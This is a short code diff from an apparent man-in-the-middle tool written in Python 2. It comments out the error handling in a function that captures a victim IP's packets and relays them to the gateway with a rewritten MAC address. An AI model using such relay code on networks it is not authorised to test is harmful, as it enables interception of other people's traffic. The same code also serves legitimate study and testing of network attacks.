@@ -85,7 +85,7 @@ def filter_and_relay_ip():
     pcap_handle = pcap.pcap(timeout_ms=0)
     pcap_handle.setfilter('ip src host {}'.format(victim_ip.in_string))
     while True:
-        try:
+        # try:
             for capture in pcap_handle:
                 if capture is None:
                     continue
@@ -110,11 +110,11 @@ def filter_and_relay_ip():
                 relaying_packet.ethernet.destination_mac = gateway_mac
                 pcap_handle.sendpacket(relaying_packet.as_bytes())
                 print '[<!]sent relay.'
-        except:
-            pass
-
-        print 'relaying ip stopped unexpectedly. restarting.'
-        pcap_handle = pcap.pcap(timeout_ms=0)
+        # except:
+        #     pass
+        # 
+        # print 'relaying ip stopped unexpectedly. restarting.'
+        # pcap_handle = pcap.pcap(timeout_ms=0)
 
 
 def main():
